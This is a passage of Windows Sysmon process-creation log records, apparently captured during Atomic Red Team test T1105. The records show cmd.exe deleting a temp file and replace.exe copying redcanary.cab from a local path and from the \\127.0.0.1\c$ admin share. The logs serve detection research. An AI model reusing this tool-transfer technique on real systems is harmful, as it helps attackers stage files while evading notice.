ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\replace.exe  \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab C:\Users\User\AppData\Local\Temp /A,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Replace File Utility,1,19652,10.0.22621.1 (WinBuild.160101.0800),"MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430",C:\Windows\System32\replace.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.123

ProcessGuid: {f57bd86a-8d5d-658c-1202-000000000f00}

ProcessId: 2312

Image: C:\Windows\System32\replace.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Replace File Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: REPLACE.EXE

CommandLine: C:\Windows\System32\replace.exe  \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab C:\Users\User\AppData\Local\Temp /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430

ParentProcessGuid: {f57bd86a-8d5d-658c-1002-000000000f00}

ParentProcessId: 10792

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A

ParentUser: WINDEV2309EVAL\User",Info,REPLACE.EXE,"""cmd.exe"" /c del %TEMP%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A",C:\Windows\System32\cmd.exe,{f57bd86a-8d5d-658c-1002-000000000f00},10792,WINDEV2309EVAL\User,,{f57bd86a-8d5d-658c-1202-000000000f00},3588,2312,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:25.1242392Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:25.123,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:25.1242392Z""/>
      <EventRecordID>19652</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:25.123</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5d-658c-1202-000000000f00}</Data>
      <Data Name=""ProcessId"">2312</Data>
      <Data Name=""Image"">C:\Windows\System32\replace.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Replace File Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">REPLACE.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\replace.exe  \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab C:\Users\User\AppData\Local\Temp /A</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d5d-658c-1002-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10792</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c del %TEMP%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.123

ProcessGuid: {f57bd86a-8d5d-658c-1202-000000000f00}

ProcessId: 2312

Image: C:\Windows\System32\replace.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Replace File Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: REPLACE.EXE

CommandLine: C:\Windows\System32\replace.exe  \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab C:\Users\User\AppData\Local\Temp /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430

ParentProcessGuid: {f57bd86a-8d5d-658c-1002-000000000f00}

ParentProcessId: 10792

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c del %%TEMP%%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %%TEMP%% /A",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19651,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.095

ProcessGuid: {f57bd86a-8d5d-658c-1002-000000000f00}

ProcessId: 10792

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %%TEMP%% /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d5d-658c-1002-000000000f00},3588,10792,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:25.0972265Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:25.095,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:25.0972265Z""/>
      <EventRecordID>19651</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:25.095</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5d-658c-1002-000000000f00}</Data>
      <Data Name=""ProcessId"">10792</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c del %%TEMP%%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %%TEMP%% /A</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.095

ProcessGuid: {f57bd86a-8d5d-658c-1002-000000000f00}

ProcessId: 10792

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %%TEMP%% /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\System32\replace.exe  ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\User\AppData\Local\Temp /A",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Replace File Utility,1,19650,10.0.22621.1 (WinBuild.160101.0800),"MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430",C:\Windows\System32\replace.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.875

ProcessGuid: {f57bd86a-8d5c-658c-0f02-000000000f00}

ProcessId: 2852

Image: C:\Windows\System32\replace.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Replace File Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: REPLACE.EXE

CommandLine: C:\Windows\System32\replace.exe  ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\User\AppData\Local\Temp /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430

ParentProcessGuid: {f57bd86a-8d5c-658c-0d02-000000000f00}

ParentProcessId: 9628

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %TEMP% /A

ParentUser: WINDEV2309EVAL\User",Info,REPLACE.EXE,"""cmd.exe"" /c del %TEMP%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %TEMP% /A",C:\Windows\System32\cmd.exe,{f57bd86a-8d5c-658c-0d02-000000000f00},9628,WINDEV2309EVAL\User,,{f57bd86a-8d5c-658c-0f02-000000000f00},3588,2852,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:24.8787945Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:24.875,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:24.8787945Z""/>
      <EventRecordID>19650</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:24.875</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5c-658c-0f02-000000000f00}</Data>
      <Data Name=""ProcessId"">2852</Data>
      <Data Name=""Image"">C:\Windows\System32\replace.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Replace File Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">REPLACE.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\replace.exe  ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\User\AppData\Local\Temp /A</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d5c-658c-0d02-000000000f00}</Data>
      <Data Name=""ParentProcessId"">9628</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c del %TEMP%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %TEMP% /A</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.875

ProcessGuid: {f57bd86a-8d5c-658c-0f02-000000000f00}

ProcessId: 2852

Image: C:\Windows\System32\replace.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Replace File Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: REPLACE.EXE

CommandLine: C:\Windows\System32\replace.exe  ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\User\AppData\Local\Temp /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CBA41C2FEA30BDAAE86EF9D11A7F244C,SHA256=3C909292FEEDA5BAC3FA8CA5A41A890F5F123CD674A1E191BEEDCEFBA94AF5F8,IMPHASH=B8B8661E3130FA043E26C71CD60FB430

ParentProcessGuid: {f57bd86a-8d5c-658c-0d02-000000000f00}

ParentProcessId: 9628

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %TEMP% /A

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
